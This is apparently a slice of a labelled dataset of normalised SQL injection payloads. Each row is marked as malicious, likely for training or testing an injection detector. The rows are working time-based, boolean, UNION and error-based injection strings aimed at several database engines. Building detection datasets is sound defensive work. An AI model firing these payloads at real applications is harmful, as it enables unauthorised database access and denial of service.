row_index,payload_norm,label,sqli_type_hint
5250,"1%' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( '%' = '",1,
5251,-6081 where 3681 = 3681 or 2603 = 3138--,1,
5252,-1190' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'yxry' like 'yxry,1,
5253,select ( case when ( 5203 = 6330 ) then 5203 else 5203* ( select 5203 from mysql.db ) end ) #,1,
5254,1'|| ( select 'lmsc' from dual where 1162 = 1162 order by 1--,1,
5255,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ""bhmu"" like ""bhmu",1,
5256,"-6357"" ) order by 1--",1,
5257,"1"" ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""zptu"" = ""zptu",1,
5258,"1 and make_set ( 9681 = 4703,4703 ) # zbrf",1,
5259,"1' ) as sjzi where 8242 = 8242 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
5260,1'+ ( select rhlb where 9477 = 9477,1,
5261,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ""%"" = """,1,
5262,"-2216"" ) where 6692 = 6692 union all select 6692,6692,6692#",1,
5263,-6397%' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and '%' = ',1,
5264,"1' ) as afnt where 4719 = 4719 and elt ( 8224 = 1275,1275 ) --",1,
5265,1' ) ) as rxxd where 5049 = 5049,1,
5266,"1'+ ( select sxco where 1623 = 1623 union all select null,null--",1,
5267,"1"" where 4978 = 4978 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
5268,1' where 3188 = 3188 and 9198 = 9198--,1,
5269,"1'+ ( select 'eoxk' where 6621 = 6621 union all select null,null#",1,
5270,1 ) as qywz where 1864 = 1864 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,
5271,"1"" ) ) union all select null,null--",1,
5272,"1 where 2988 = 2988 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
5273,"1' ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'mseo' like 'mseo",1,
5274,"1"" ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""vlev"" like ""vlev",1,
5275,1'+ ( select 'rkap' where 9692 = 9692,1,
5276,"1%' ) ) and elt ( 4249 = 4249,7259 ) and ( ( '%' = '",1,
5277,"1"" ) ) as qejm where 9014 = 9014 union all select null,null,null,null,null,null#",1,
5278,-9556' ) where 2472 = 2472 or ( 2883 = 9968 ) *9968--,1,
5279,1 ) as nxmd where 8650 = 8650,1,
